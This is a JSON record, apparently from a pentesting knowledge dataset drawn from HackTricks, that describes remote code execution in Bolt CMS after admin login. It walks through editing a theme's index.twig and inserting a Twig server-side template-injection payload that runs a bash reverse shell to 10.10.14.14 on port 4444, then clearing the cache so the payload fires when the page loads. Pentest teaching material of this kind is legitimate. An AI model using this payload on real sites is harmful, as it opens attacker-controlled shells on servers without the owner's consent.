{
  "id": "network_services_pentesting_ca8acd18192f",
  "category": "network-services-pentesting",
  "title": "bolt cms",
  "description": "# Bolt CMS\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## RCE\n\nAfter login as admin (go to /bot lo access the login prompt), you can get RCE in Bolt CMS:\n\n- Select `Configuration` -> `View Configuration` -> `Main Configuration` or go the the URL path `/bolt/file-edit/config?file=/bolt/config.yaml`\n  - Check the value of theme\n\n<figure><img src=\"../../images/image (771).png\" alt=\"\"><figcaption></figcaption></figure>\n\n- Select `File management` -> `View & edit templates`\n  - Select the the",
  "payloads": [
    "# Bolt CMS",
    "{{#include ../../banners/hacktricks-training.md}}",
    "## RCE",
    "After login as admin (go to /bot lo access the login prompt), you can get RCE in Bolt CMS:",
    "- Select `Configuration` -> `View Configuration` -> `Main Configuration` or go the the URL path `/bolt/file-edit/config?file=/bolt/config.yaml`",
    "- Check the value of theme",
    "<figure><img src=\"../../images/image (771).png\" alt=\"\"><figcaption></figcaption></figure>",
    "- Select `File management` -> `View & edit templates`",
    "- Select the theme base found in the previous (`base-2021` in this case) step and select `index.twig`",
    "- In my case this is in the URL path /bolt/file-edit/themes?file=/base-2021/index.twig",
    "- Set your payload in this file via [template injection (Twig)](../../pentesting-web/ssti-server-side-template-injection/index.html#twig-php), like: `{{['bash -c \"bash -i >& /dev/tcp/10.10.14.14/4444 0>&1\"']|filter('system')}}`",
    "- And save changes",
    "<figure><img src=\"../../images/image (948).png\" alt=\"\"><figcaption></figcaption></figure>",
    "- Clear the cache in `Maintenance` -> `Clear the cache`",
    "- Access again the page as a regular user, and the payload should be executed"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/network-services-pentesting/pentesting-web/bolt-cms.md"
  ]
}